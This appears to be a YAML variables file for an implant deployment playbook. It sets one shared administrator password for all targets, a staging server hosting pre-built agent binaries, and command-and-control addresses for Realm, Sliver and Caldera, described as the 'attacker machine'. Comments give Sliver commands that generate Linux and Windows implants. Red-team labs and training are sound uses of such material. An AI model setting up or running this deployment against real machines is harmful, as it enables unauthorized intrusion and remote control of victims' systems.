# =============================================================================
#  SHARED CREDENTIALS  —  One user/password used for all targets
# =============================================================================
deploy_user:     "administrator"
deploy_password: "Password123!"

# =============================================================================
#  C2 / STAGING SERVER  —  Update to your attacker machine IP
# =============================================================================

# HTTP staging server that hosts pre-built agent binaries
# Run:  python3 -m http.server 9999  from your staging directory
staging_ip:   "192.168.1.5"
staging_port: "9999"

# ── Realm (Imix) ──────────────────────────────────────────────────────────────
realm_c2_ip:   "192.168.1.5"
realm_c2_port: "1337"

# ── Sliver ────────────────────────────────────────────────────────────────────
# Pre-generate implants on your Sliver C2 before running deployment:
#   sliver> generate --mtls {{ sliver_c2_ip }}:{{ sliver_c2_port }} --os linux  --save /tmp/staging/sliver-implant-linux
#   sliver> generate --mtls {{ sliver_c2_ip }}:{{ sliver_c2_port }} --os windows --save /tmp/staging/sliver-implant.exe
sliver_c2_ip:        "192.168.1.5"
sliver_c2_port:      "8888"
sliver_staging_port: "9999"   # same staging server, just different file names

# ── Caldera ───────────────────────────────────────────────────────────────────
# Sandcat binaries are served directly from the Caldera server
caldera_c2_ip:   "192.168.1.5"
caldera_c2_port: "8888"
caldera_group:   "red"
